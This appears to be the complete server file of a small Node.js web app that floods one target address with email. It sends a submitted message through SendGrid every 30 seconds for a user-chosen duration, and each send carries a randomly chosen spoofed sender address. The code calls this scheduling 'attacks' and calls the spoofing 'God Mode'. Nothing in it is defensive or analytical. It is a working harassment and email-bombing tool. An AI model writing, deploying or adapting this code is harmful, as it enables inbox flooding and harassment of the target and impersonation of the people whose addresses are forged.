// server.js

var DIR = process.env.OPENSHIFT_DATA_DIR || './data/';

var express     = require('express'),
    cfg         = require(DIR +'config.json'),
    morgan      = require('morgan'),
    compression = require('compression'),
    bodyParser  = require('body-parser'),
    low         = require('lowdb'),
    sg          = require('sendgrid')(cfg.sg.user, cfg.sg.key),
    app         = express();

// application middleware
app.use(morgan('combined'));
app.use(compression());
app.use(bodyParser.urlencoded({ extended : false }));
app.use(express.static(__dirname + '/static', { maxAge: 86400000 }));

// return a random record from the database
low.mixin({
  random : function (array) {
    var idx = Math.random() * array.length;
    return array[Math.floor(idx)];
  }
});

var db = low(DIR + 'db.json');

function handler(err, json) {
  if (err) { return console.error(err); }
  console.log(json);
}

// schedules all attacks
function schedule(id, duration) {
  var interval,
      sec = 1000,      // js measures in milliseconds
      min = 60 * sec;

  // runs code every 30 seconds
  interval = setInterval(function () {

    // get a random address for the from field
    // God Mode
    var addr = db('address').random();
    var record = db('posts').find({id : id});

    // send an email
    sg.send({
      to      : cfg.params.target,
      from    : addr,
      fromname : cfg.params.alias,
      subject : record.data.subject,
      text    : record.data.body,
      replyto : cfg.params.reply
    }, handler);
  }, 30*sec);

  // clears the interval after duration has passed
  setTimeout(function () {
    clearInterval(interval);
  }, duration*min);
}

// routes to send
app.post('/compose', function (req, res, next) {

  // insert the post into the database
  var id = Date.now();
  db('posts').push({
    id       : id,
    ip       : req.ip,
    data     : req.body,
    recieved : new Date().toString()
  });

  // schedule a new job
  var duration = req.body.duration;
  schedule(id, duration);

  // return the user to a success page
  res.redirect('/success.html');
});

var port = process.env.OPENSHIFT_NODEJS_PORT || 8080,
    ipAddress = process.env.OPENSHIFT_NODEJS_IP || '127.0.0.1';

// configure application port
app.listen(port, ipAddress, console.log('App running on port', port, 'and ip', ipAddress));
